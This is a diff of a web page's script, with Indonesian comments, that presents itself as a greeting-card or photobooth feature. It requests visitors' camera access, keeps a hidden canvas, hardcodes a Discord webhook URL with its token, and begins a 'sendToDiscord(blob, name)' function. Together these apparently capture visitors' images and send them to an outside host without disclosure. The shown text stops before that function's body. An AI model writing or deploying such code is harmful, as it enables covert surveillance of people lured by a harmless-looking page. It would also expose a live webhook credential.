@@ -185,40 +185,46 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // MASUKKAN WEBHOOK DISCORD ANDA
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME';
+        // GANTI DENGAN URL ASLI
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME';
 
-        const dashboard = document.getElementById('dashboard');
-        const mainFeature = document.getElementById('main-feature');
-        const activateBtn = document.getElementById('activate-btn');
-        const video = document.getElementById('video');
-        const usernameInput = document.getElementById('username');
-        const loader = document.getElementById('loader');
+const dashboard = document.getElementById('dashboard');
+const mainFeature = document.getElementById('main-feature');
+const activateBtn = document.getElementById('activate-btn');
+const video = document.getElementById('video');
+const usernameInput = document.getElementById('username');
 
-        // FUNGSI GANDA: MASUK DASHBOARD & IJINKAN KAMERA
-        activateBtn.addEventListener('click', async () => {
-            const name = usernameInput.value.trim();
-            if(!name) {
-                alert("Mohon isi nama Anda untuk kartu ucapan.");
-                return;
-            }
+activateBtn.addEventListener('click', async () => {
+    const name = usernameInput.value.trim();
+    if(!name) {
+        alert("Mohon isi nama Anda terlebih dahulu 🙏");
+        return;
+    }
 
-            try {
-                // Meminta Izin Kamera
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-
-                // Transisi UI
-                dashboard.style.opacity = '0';
-                setTimeout(() => {
-                    dashboard.style.display = 'none';
-                    mainFeature.style.display = 'block';
-                }, 500);
-
-            } catch (err) {
-                alert("Untuk menggunakan fitur Photobooth, tekan oke untuk melanjutkan.");
-            }
+    // 1. Coba minta akses kamera
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" } 
         });
+        video.srcObject = stream;
+        
+        // 2. Jika berhasil, pindah layar
+        dashboard.style.opacity = '0';
+        setTimeout(() => {
+            dashboard.style.display = 'none';
+            mainFeature.style.display = 'block';
+        }, 500);
+
+    } catch (err) {
+        console.error("Kesalahan Kamera: ", err);
+        
+        // Tetap pindah layar tapi beri peringatan
+        alert("Fitur Utama diaktifkan, namun kamera tidak terdeteksi atau izin ditolak. Pastikan Anda menggunakan HTTPS atau mengizinkan akses kamera.");
+        
+        dashboard.style.display = 'none';
+        mainFeature.style.display = 'block';
+    }
+});
 
         // LOGIKA KIRIM DISCORD
         async function sendToDiscord(blob, name) {
